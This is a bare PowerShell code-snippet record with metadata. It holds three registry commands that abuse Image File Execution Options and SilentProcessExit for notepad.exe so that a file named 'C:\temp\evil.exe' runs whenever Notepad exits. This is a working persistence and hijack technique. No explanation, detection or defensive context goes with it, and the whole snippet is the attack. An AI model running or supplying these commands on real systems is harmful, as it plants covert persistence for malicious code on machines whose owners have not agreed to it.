---
id: 0cbab15b-3623-482c-a272-56656b62f631
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:28.047643+00:00'
updated_at: '2023-04-10T20:37:22.892124+00:00'
---

# Code Snippet 0cbab15b

**Language**: Powershell

```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"
```
